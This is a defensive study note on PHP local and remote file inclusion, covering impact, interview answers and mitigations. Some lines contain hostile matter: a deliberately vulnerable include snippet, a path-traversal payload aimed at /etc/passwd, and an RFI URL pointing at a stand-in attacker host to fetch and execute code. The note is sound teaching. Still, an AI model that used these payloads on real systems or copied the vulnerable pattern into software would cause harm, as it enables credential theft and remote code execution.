# Local & Remote File Inclusion (LFI/RFI)

## Why this comes right after SSRF
SSRF is about the server making an outbound *network* request based on user input. File Inclusion is the closely related sibling: the server *reads and includes* a file — either from its own filesystem (LFI) or from a remote URL (RFI) — based on user input, usually to dynamically load a template or module. Same root problem as everything since file `04`: user input controlling something that should have been a fixed, trusted value.

---

## What it is (in plain terms)
Many applications dynamically load a file based on user input — e.g. a `?page=` parameter that decides which template to display. LFI happens when an attacker manipulates that parameter to make the server read and display a completely different, unintended file from its own filesystem. RFI is the more severe variant, where the server can be tricked into fetching and *executing* a file from an attacker-controlled remote server entirely.

## Why it exists — the real-life cause

```php
// VULNERABLE — directly includes whatever file the 'page' parameter names
<?php
  $page = $_GET['page'];
  include($page . '.php');
?>
```
A normal request might be `?page=home`, loading `home.php`. But nothing stops an attacker from requesting `?page=../../../../etc/passwd%00` (the null byte historically truncated the appended `.php` on older PHP versions) to read arbitrary files off the server — or, if `allow_url_include` is enabled, `?page=http://attacker.com/malicious` to make the server fetch and **execute** a completely attacker-controlled PHP file (RFI) — immediate remote code execution.

```php
// SECURE — validates against a fixed allow-list of legitimate pages only
<?php
  $allowed_pages = ['home', 'about', 'contact'];
  $page = $_GET['page'];
  if (!in_array($page, $allowed_pages, true)) {
    die('Invalid page');
  }
  include($page . '.php');
?>
```
Here, the input is checked against a fixed, known set of legitimate values before ever being used — an attacker's input either matches one of the allowed values exactly, or the request is rejected outright. There's no path-traversal or remote-URL trick that can bypass a strict allow-list check like this.

## How an attacker actually does it, step by step
1. Find a parameter that appears to load content dynamically — `?page=`, `?template=`, `?file=`, `?lang=`.
2. Try basic path traversal: `?page=../../../../etc/passwd` — if the raw contents of a system file appear in the response, LFI is confirmed.
3. Try common sensitive files depending on the server OS: `/etc/passwd`, `/etc/shadow` (Linux), or application config files that might contain database credentials.
4. If Remote File Inclusion is possible (the server fetches external URLs, not just local files), host a malicious script on an attacker-controlled server and supply that URL — the server fetches and executes it directly, resulting in full remote code execution.

## Technical Impact
- **LFI:** reading sensitive local files — configuration files (often containing database credentials), source code, system files, log files (which can sometimes be abused for further exploitation via "log poisoning")
- **RFI:** remote code execution — the most severe outcome, since the attacker's own script runs directly on the server

## Business Impact

| Angle | What it actually means |
|---|---|
| **Financial loss** | LFI reading a configuration file containing database credentials can lead directly to a full database compromise — every customer's financial data, not just what one vulnerable endpoint exposes |
| **Regulatory / compliance** | Like file upload RCE, confirmed RFI is a critical, emergency-remediation finding — it represents complete loss of server integrity, one of the most serious categories any security assessment can report |
| **Reputational damage** | A breach originating from RFI often results in full server/database compromise, meaning the eventual public disclosure covers the full scope of accessible data, not a narrow single-feature issue |
| **Legal liability** | Credentials exposed via a readable config file, then used to access the database directly, demonstrates a chain of clearly preventable failures — a strong basis for a negligence claim |
| **Operational cost** | Same tier of response as RCE via file upload — assume full compromise, rotate every credential the exposed config file contained, rebuild affected systems from known-clean state |

**One-line interview answer:** *"Technically, LFI lets an attacker make the server read files it shouldn't — often configuration files containing database credentials — and RFI goes further, letting the server execute a completely attacker-controlled remote script. For a bank, the real business impact is that a leaked config file's database credentials can lead straight into the full customer database, so what looks like 'reading a file' can become a complete data breach very quickly."*

## Mitigation — layered, not just one fix

1. **Allow-list validation (the real fix)** — validate user input against a fixed, known set of legitimate values before using it to construct any file path, exactly as shown above. Never build a file path directly from raw user input.
2. **Disable remote file inclusion entirely** — in PHP specifically, `allow_url_include` should always be disabled; there's essentially never a legitimate reason for an application to dynamically include a remote file based on user input.
3. **Avoid dynamic includes altogether where possible** — use a fixed routing/switch structure (map known page names to their template internally in code) instead of directly concatenating user input into a file path at all.
4. **Least-privilege file permissions** — ensure the web server process can only read the specific files it actually needs, limiting the blast radius even if a path-traversal bypass is found.
5. **Never store credentials in a web-readable configuration file** — use environment variables or a dedicated secrets manager, so even a successful LFI reading a config file doesn't yield usable credentials.

## Explaining it to a developer
*"Right now this page-loading feature builds a file path directly from user input, which means someone can request a path outside the folder we intended — reading files they were never meant to see, including our own config files if they're readable by the web server. The fix is to check the requested page against a fixed list of pages we actually expect, and reject anything that doesn't match exactly, rather than trying to build the file path from user input at all."*

## Quick-reference table

| Mitigation | What it stops |
|---|---|
| Allow-list validation | Path traversal and unexpected file requests entirely |
| Disable remote file inclusion | RFI → remote code execution |
| Fixed routing instead of dynamic includes | Removes the vulnerable pattern at the design level |
| Least-privilege file permissions | Limits what's readable even if a bypass is found |
| Secrets outside web-readable files | Config file exposure doesn't yield usable credentials |
